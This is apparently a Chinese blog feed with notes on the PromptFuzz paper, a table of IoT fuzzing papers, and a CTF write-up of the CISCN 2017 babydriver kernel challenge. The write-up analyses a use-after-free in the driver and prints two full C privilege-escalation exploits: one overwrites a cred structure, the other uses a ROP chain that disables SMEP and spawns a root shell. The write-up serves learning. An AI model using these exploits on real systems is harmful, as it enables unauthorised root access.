class="string">&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>然后记得运行<code>vim +PluginInstall +qall</code>安装插件</p>
<blockquote>
<p>2025年10月28日更新，还是改用neovim吧，更好用，更现代化</p>
</blockquote>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>PromptFuzz论文阅读</title>
    <url>/posts/b532f894.html</url>
    <content><![CDATA[<p><strong>题目</strong>：Prompt Fuzzing for Fuzz Driver Generation  </p>
<p><strong>期刊&#x2F;会议</strong>：CCS 2024</p>
<p><strong>作者</strong>：Hao Chen （腾讯Big data Lab）</p>
<h2 id="论文简介"><a href="#论文简介" class="headerlink" title="论文简介"></a>论文简介</h2><p><strong>主题</strong>：提出了一种新的基于提示词对库文件进行fuzz的方法。</p>
<p><strong>背景</strong>：对标准库的fuzz存在几个难点</p>
<ul>
<li>api函数覆盖度不够（hopper给予解决，但其种子的输入空间太大）</li>
<li>种子输入空间太大，如何生成高质量的种子才能进入到较深的分支。</li>
</ul>
<p><strong>整体架构</strong>：</p>
<ul>
<li>Instructive Program Generation：提取库的类型定义以及api函数定义，喂给大模型初步生成fuzz driver( Program Instance)。</li>
<li>Erroneous Program Validation：运行Program Instance（有fuzz语料库），去除错误程序（检查运行状态），同时获取代码覆盖率。</li>
<li>Coverage Guide Mutation：将其代码覆盖率反馈给大模型，对Program Instance进行变异，添加或删除api函数。</li>
<li>Constrained Fuzzer Scheduling：提取输入的约束，并根据约束将输入值从大模型提供的常数值修改成模糊测试输入。进行模糊测试</li>
</ul>
<p>其实相当于在fuzz前又做了一个对fuzz driver的fuzz，可以获取到高质量的fuzz driver。</p>
<img src="/posts/b532f894/image-20250616172647380.png" class="" title="image-20250616172647380">

<h2 id="技术路线"><a href="#技术路线" class="headerlink" title="技术路线"></a>技术路线</h2><h3 id="Instructive-Program-Generation"><a href="#Instructive-Program-Generation" class="headerlink" title="Instructive Program Generation"></a>Instructive Program Generation</h3><p>其提示词如下：</p>
<img src="/posts/b532f894/image-20250616174337281.png" class="" title="image-20250616174337281">

<h3 id="Erroneous-Program-Validation"><a href="#Erroneous-Program-Validation" class="headerlink" title="Erroneous Program Validation"></a>Erroneous Program Validation</h3><p>分为三步：</p>
<ol>
<li>去除语法错误</li>
<li>使用fuzzing语料库来查看目标程序是否存在显著语义错误</li>
<li>移除无效或价值不大的测试驱动</li>
</ol>
<img src="/posts/b532f894/image-20250616175036108.png" class="" title="image-20250616175036108">



<blockquote>
<p>碎碎念，先看到这里了，因为是针对源码的，与本人研究方向不是很相关，当然其fuzz fuzz_driver的思想很不错，很新颖。</p>
</blockquote>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
  </entry>
  <entry>
    <title>IoT Fuzz论文调研</title>
    <url>/posts/b532f894.html</url>
    <content><![CDATA[<p>IoT领域有关Fuzz论文的汇总调研，随缘更新~</p>
<p>主要关注模糊测试分析的IoT目标对象、白&#x2F;灰&#x2F;黑测试、模拟级别、基于工具等信息</p>
<table>
<thead>
<tr>
<th align="center">论文名称</th>
<th align="center">期刊会议</th>
<th align="center">目标</th>
<th align="center">模糊测试</th>
<th align="center">模拟级别</th>
<th align="center">基于工具</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Firmadyne</td>
<td align="center">NDSS 2016</td>
<td align="center">Linux服务</td>
<td align="center"></td>
<td align="center">系统模拟</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">Firm-AFL</td>
<td align="center">USENIX 2019</td>
<td align="center">Linux服务</td>
<td align="center">灰盒</td>
<td align="center">系统+用户模拟增强</td>
<td align="center">QEMU，TriForce，DECAF</td>
</tr>
<tr>
<td align="center">FirmAE</td>
<td align="center">ACSAC 2020</td>
<td align="center">Linux服务</td>
<td align="center"></td>
<td align="center">系统模拟</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">EQUAFL</td>
<td align="center">ISSTA 2022</td>
<td align="center">Linux服务</td>
<td align="center">灰盒</td>
<td align="center">用户模拟</td>
<td align="center">QEMU</td>
</tr>
<tr>
<td align="center">Greenhouse</td>
<td align="center">USENIX 2023</td>
<td align="center">Linux服务</td>
<td align="center">灰盒</td>
<td align="center">用户模拟</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">IoTFuzzer</td>
<td align="center">NDSS 2018</td>
<td align="center">带App的IoT设备</td>
<td align="center">黑盒</td>
<td align="center">硬件设备</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">Diane</td>
<td align="center">SP 2021</td>
<td align="center">带App的IoT设备</td>
<td align="center">黑盒</td>
<td align="center">硬件设备</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">P2IM</td>
<td align="center">USENIX 2020</td>
<td align="center">裸机</td>
<td align="center">黑盒</td>
<td align="center">系统模拟</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">uEmu</td>
<td align="center">USENIX 2021</td>
<td align="center">裸机</td>
<td align="center">灰盒</td>
<td align="center">系统模拟</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">Fuzzware</td>
<td align="center">USENIX 2022</td>
<td align="center">裸机</td>
<td align="center">灰盒</td>
<td align="center">系统模拟</td>
<td align="center">Unicorn</td>
</tr>
<tr>
<td align="center">SAFIREFUZZ</td>
<td align="center">USENIX 2023</td>
<td align="center">裸机</td>
<td align="center">灰盒</td>
<td align="center">系统模拟</td>
<td align="center">LibAFL</td>
</tr>
<tr>
<td align="center">SFuzz</td>
<td align="center">CCS 2022</td>
<td align="center">RTOS</td>
<td align="center">灰盒</td>
<td align="center">局部模拟</td>
<td align="center">Angr+Unicorn？</td>
</tr>
<tr>
<td align="center">LLMIF</td>
<td align="center">SP 2024</td>
<td align="center">ZigBee协议</td>
<td align="center">灰盒</td>
<td align="center">硬件设备</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">mGPTFuzz</td>
<td align="center">USENIX 2024</td>
<td align="center">Matter协议</td>
<td align="center">灰盒</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">HFL</td>
<td align="center">NDSS 2020</td>
<td align="center">Linux Kernel</td>
<td align="center"></td>
<td align="center">N&#x2F;A</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">ljon</td>
<td align="center">SP 2020</td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">FireWire</td>
<td align="center">NDSS 2022</td>
<td align="center">无线基带</td>
<td align="center"></td>
<td align="center">系统模拟</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">Agamotto</td>
<td align="center">USENIX 2020</td>
<td align="center">Linux Kernel Driver</td>
<td align="center"></td>
<td align="center">系统模拟</td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
  </entry>
  <entry>
    <title>2025-05-16-CICSN_2017_babydriver学习</title>
    <url>/posts/5f22e5f4.html</url>
    <content><![CDATA[<p> PWN kernel入门题。</p>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>题目地址：<a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/kernel/CISCN2017-babydriver/babydriver.tar">https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/kernel/CISCN2017-babydriver/babydriver.tar</a><br>解压后，文件目录结构如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ tree .</span><br><span class="line">.</span><br><span class="line">├── babydriver</span><br><span class="line">│   ├── boot.sh		# 启动脚本</span><br><span class="line">│   ├── bzImage		# 内核</span><br><span class="line">│   └── rootfs.cpio	# 文件系统</span><br><span class="line">├── babydriver.i64</span><br><span class="line">├── babydriver.ko	# 内核模块</span><br><span class="line">├── babydriver.tar</span><br><span class="line">├── cred			# cred exp</span><br><span class="line">├── cred.c</span><br><span class="line">├── tty_struct		# tty_struct exp</span><br><span class="line">└── tty_struct.c</span><br></pre></td></tr></table></figure>

<p>进入babydriver目录，直接运行<code>sudo ./boot.sh</code>即可把内核跑起来</p>
<blockquote>
<p>如果启动 boot.sh 失败，需要虚拟机开一下 <code>虚拟化 Intel VT-x/EPT 或 AMD-V/RVI</code>，开不了的话需要在 windows 下的管理员 cmd 窗口中执行 <code>bcdedit /set hypervisorlaunchtype off</code>，然后重启。</p>
</blockquote>
<p>查看.&#x2F;boot.sh内容，为qemu系统模拟命令，<code>-cpu kvm64,+smep</code>表示开启smep防护：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append &#x27;console=ttyS0 root=/dev/r</span><br><span class="line">am oops=panic panic=1&#x27; -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,th</span><br><span class="line">reads=1 -cpu kvm64,+smep</span><br></pre></td></tr></table></figure>

<p>一些常见的内核防护：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">.</span> <span class="string">mesg</span> <span class="string">Restrictions：通过设置</span> <span class="string">/proc/sys/kernel/dmesg_restrict</span> <span class="string">为</span> <span class="number">1</span><span class="string">，可以将</span> <span class="string">dmesg</span> <span class="string">输出的信息视为敏感信息（默认为</span> <span class="number">0</span><span class="string">）</span></span><br><span class="line"><span class="number">2</span><span class="string">.</span> <span class="string">Kernel</span> <span class="string">Address</span> <span class="string">Display</span> <span class="string">Restriction：/proc/sys/kernel/kptr_restrict</span> <span class="string">被默认设置为</span> <span class="number">1</span><span class="string">，导致无法通过</span> <span class="string">/proc/kallsyms</span> <span class="string">获取内核地址</span></span><br><span class="line"><span class="number">3</span><span class="string">.</span> <span class="string">Kernel</span> <span class="string">PageTable</span> <span class="string">Isolation：KPTI，内核页表隔离，进程地址空间被分成了内核地址空间和用户地址空间，其中内核地址空间映射到了整个物理地址空间，而用户地址空间只能映射到指定的物理地址空间。内核地址空间和用户地址空间共用一个页全局目录表。为了彻底防止用户程序获取内核数据，可以令内核地址空间和用户地址空间使用两组页表集</span></span><br><span class="line"><span class="number">4</span><span class="string">.</span> <span class="string">Kernel</span> <span class="string">ASLR：内核地址空间布局随机化</span></span><br><span class="line"><span class="number">5</span><span class="string">.</span> <span class="string">SMEP（Supervisor</span> <span class="string">Mode</span> <span class="string">Execution</span> <span class="string">Protection</span> <span class="string">管理模式执行保护）：禁止CPU处于</span> <span class="string">ring0</span> <span class="string">模式时执行用户空间代码。</span></span><br><span class="line"><span class="number">6</span><span class="string">.</span> <span class="string">SMAP（Superivisor</span> <span class="string">Mode</span> <span class="string">Access</span> <span class="string">Protection</span> <span class="string">管理模式访问保护）：禁止内核CPU访问用户空间的数据。</span></span><br><span class="line"><span class="number">7</span><span class="string">.</span> <span class="string">Stack</span> <span class="string">Protector：和用户态相同，canary</span></span><br><span class="line"><span class="number">8</span><span class="string">.</span> <span class="string">Address</span> <span class="string">Protection：内核空间和用户空间共享虚拟内存地址，因此需要防止用户空间mmap</span> <span class="string">的内存从0开始，从而缓解空指针引用攻击。</span></span><br></pre></td></tr></table></figure>

<p>解包文件系统命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解包</span></span><br><span class="line">mv rootfs.cpio rootfs.cpio.gz</span><br><span class="line">gunzip rootfs.cpio.gz</span><br><span class="line">cpio -idmv &lt; rootfs.cpio</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打包</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解包后查看<code>init</code>文件内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ cat init</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod /lib/modules/4.4.72/babydriver.ko</span><br><span class="line">chmod 777 /dev/babydev</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>

<p>可以发现为创建仅root可读的flag文件，同时将babydriver.ko装载进内核。</p>
<p>需要利用存在漏洞的babydriver.ko进行内核提权，获得root权限。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>ida打开<code>babydriver.ko</code>文件：</p>
<p><strong>babydriver_init函数</strong>：</p>
<p>设备注册函数，可以看到向内核注册了babydev设备，其中有几个需要关注的函数：</p>
<ul>
<li>alloc_chrdev_region、device_create：设备注册函数，向内核注册babydev设备，设备文件默认位置为<code>/dev/</code>目录下</li>
<li>cdev_init：设备操作函数注册，定义了对设备操作的回调函数结构体<code>fops</code>。</li>
</ul>
<img src="/posts/5f22e5f4/image-20250516154123424.png" class="" title="image-20250516154123424">

<p>fops结构体内容如下：如果你对目标设备进行对应的系统调用，就会执行相应的回调函数</p>
<img src="/posts/5f22e5f4/image-20250516154534748.png" class="" title="image-20250516154534748">

<p><strong>babyopen函数</strong>：<br>调用<code>kmem_cache_alloc_trace</code>函数，申请kmem_cache，相当于内核的堆</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">kmem_cache_alloc_trace</span><span class="params">(<span class="keyword">struct</span> kmem_cache* cachep, <span class="type">gfp_t</span> flags, <span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure>
<img src="/posts/5f22e5f4/image-20250516170301345.png" class="" title="image-20250516170301345">
<p><strong>babyread函数</strong>：<br>调用了<code>copy_to_user</code>函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">copy_to_user</span><span class="params">(<span class="type">void</span> *to, <span class="type">const</span> <span class="type">void</span> *from, <span class="type">unsigned</span> <span class="type">long</span> n)</span>;</span><br></pre></td></tr></table></figure>
<p>函数功能相当于<code>memcpy</code>，将系统空间指针地址（from）复制到用户空间指针地址（to）：</p>
<img src="/posts/5f22e5f4/image-20250516165921651.png" class="" title="image-20250516165921651">
<p><strong>babywrite函数</strong>：<br>调用<code>copy_from_user</code>函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">copy_from_user</span><span class="params">(<span class="type">void</span> *to, <span class="type">const</span> <span class="type">void</span> *from, <span class="type">unsigned</span> <span class="type">long</span> n)</span>;</span><br></pre></td></tr></table></figure>
<p>相当于<code>memcpy</code>，将用户空间指针内容（from）复制到内核空间指针（to）</p>
<img src="/posts/5f22e5f4/image-20250517102155991.png" class="" title="image-20250517102155991">
<p><strong>babyioctl函数</strong>：<br>重新申请一个指定大小的<code>device_buf</code>.</p>
<img src="/posts/5f22e5f4/image-20250517102358417.png" class="" title="image-20250517102358417">
<p><strong>babyrelease函数</strong>：<br>调用<code>kfree</code>函数，但是没有清零，存在UAF漏洞。</p>
<img src="/posts/5f22e5f4/image-20250517102237141.png" class="" title="image-20250517102237141">
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>linux内核提权方法：</p>
<ul>
<li><p>直接改进程的struct cred结构体（老版本内核可用）；</p>
<blockquote>
<p>kernel 4.4.72 时, cred 结构体没有专门的一个 kmem_cache (slub allocator) 来分配. struct cred 大小是 0xa8, 会使用 kmalloc-192 这个 kmem_cache 来分配. 而我们知道, cred 中保存了 uid, gid, 等, 如果可以改变这些, 那么就可以成功提权.</p>
<p>不过后续版本的 kernel 创建了一个 cred_jar 的 kmem_cache, 专门用来分配 cred, 而不是使用 kmalloc-192, 所以无法用这个 UAF 来直接修改 euid 了.</p>
</blockquote>
</li>
<li><p><code>commit_creds(prepare_kernel_cred(0))</code>（通用方法，也比较简单？）<br>Linux系统为宏内核，内核模块加载到内核后可以访问内核空间的内存，如果同时打开两次<code>/dev/babydev</code>设备，两个进程指向的全局指针<code>babydev_struct</code>是同一个。如果同时打开两个，然后释放其中一个，会调用babyrelease函数将<code>babydev_struct</code>结构体释放，而此时另一个设备仍然可以继续访问该结构体，存在UAF。<br><strong>利用思路1</strong>：修改cred结构体</p>
</li>
</ul>
<ol>
<li>同时打开两个设备，</li>
<li>使用ioctl修改<code>babydev_struct</code>结构体大小为<code>cred</code>结构体大小，</li>
<li>释放一个设备，</li>
<li>fork新进程，新进程的cred结构体会申请到释放的设备<code>babydev_struct</code>，此时未释放的进程仍可以修改新进程的cred结构体</li>
<li>修改cred结构体uid，guid，sgid、euid、egid为0，返回后创建shell即可实现提权。<br>exp.c<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stropts.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 打开两次设备</span></span><br><span class="line">	<span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">	<span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 修改 babydev_struct.device_buf_len 为 sizeof(struct cred)</span></span><br><span class="line">	ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0xa8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 释放 fd1</span></span><br><span class="line">	close(fd1);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 新起进程的 cred 空间会和刚刚释放的 babydev_struct 重叠</span></span><br><span class="line">	<span class="type">int</span> pid = fork();</span><br><span class="line">	<span class="keyword">if</span>(pid &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;[*] fork error!&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 通过更改 fd2，修改新进程的 cred 的 uid，gid 等值为0</span></span><br><span class="line">		<span class="type">char</span> zeros[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">		write(fd2, zeros, <span class="number">28</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;[+] root now.&quot;</span>);</span><br><span class="line">			system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		wait(<span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	close(fd2);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<strong>利用思路2</strong>：ROP调用<code>commit_creds(prepare_kernel_cred(0))</code><br>使用UAF关闭SMEP防护，使用ret2usr提权。系统根据 cr4 寄存器的第 20 位判断是否开启 SMEP 保护，通常可以向 CR4 寄存器中写入 0x6f0 来关闭 SMEP。</li>
<li>同时打开两个设备，</li>
<li>使用ioctl修改<code>babydev_struct</code>结构体大小为<code>tty_struct</code>结构体大小，</li>
<li>释放一个设备</li>
<li>打开<code>/dev/ptmx</code>获取到tty_struct，此时未释放的设备进程仍然可以修改tty_struct</li>
<li>修改tty_operations结构体为篡改后的结构体</li>
<li>使用write触发ROP（ROP逻辑为关闭SMEP，然后ret2usr获取root shell）<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prepare_kernel_cred_addr 0xffffffff810a1810</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> commit_creds_addr 0xffffffff810a1420</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* fake_tty_operations[<span class="number">30</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	__asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">			<span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">			<span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">			<span class="string">&quot;pushf;&quot;</span></span><br><span class="line">			<span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">			);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>* (*pkc)(<span class="type">int</span>) = prepare_kernel_cred_addr;</span><br><span class="line">    <span class="type">void</span> (*cc)(<span class="type">char</span>*) = commit_creds_addr;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">32</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810d238d</span>;		<span class="comment">// pop rdi; ret;</span></span><br><span class="line">    rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81004d80</span>;		<span class="comment">// mov cr4, rdi; pop rbp; ret;</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)get_root;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81063694</span>;		<span class="comment">// swapgs; pop rbp; ret;</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff814e35ef</span>;		<span class="comment">// iretq; ret;</span></span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)get_shell;</span><br><span class="line">    rop[i++] = user_cs;                <span class="comment">/* saved CS */</span></span><br><span class="line">    rop[i++] = user_rflags;            <span class="comment">/* saved EFLAGS */</span></span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		fake_tty_operations[i] = <span class="number">0xFFFFFFFF8181BFC5</span>; </span><br><span class="line">	&#125;</span><br><span class="line">    fake_tty_operations[<span class="number">0</span>] = <span class="number">0xffffffff810635f5</span>;  <span class="comment">//pop rax; pop rbp; ret;</span></span><br><span class="line">    fake_tty_operations[<span class="number">1</span>] = (<span class="type">size_t</span>)rop;</span><br><span class="line">    fake_tty_operations[<span class="number">3</span>] = <span class="number">0xFFFFFFFF8181BFC5</span>;  <span class="comment">// mov rsp,rax ; dec ebx ; ret</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0x2e0</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd_tty = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR|O_NOCTTY);</span><br><span class="line">    <span class="type">size_t</span> fake_tty_struct[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(fd2, fake_tty_struct, <span class="number">32</span>);</span><br><span class="line">    fake_tty_struct[<span class="number">3</span>] = (<span class="type">size_t</span>)fake_tty_operations;</span><br><span class="line">    write(fd2,fake_tty_struct, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    write(fd_tty, buf, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h2><p>安装<code>vmlinux-to-elf</code>工具</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip3 install --upgrade git+https://github.com/marin-m/vmlinux-to-elf</span><br><span class="line">vmlinux-to-elf ./bzImage vmlinux</span><br></pre></td></tr></table></figure>
<p>调试启动脚本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动 qemu</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">	-initrd rootfs.cpio \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append &#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27;\</span><br><span class="line">    -enable-kvm \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -m 64M \ </span><br><span class="line">    --nographic \</span><br><span class="line">    -smp cores=1,threads=1 \</span><br><span class="line">    -cpu kvm64,+smep \</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure>

<p>rootfs打包：</p>
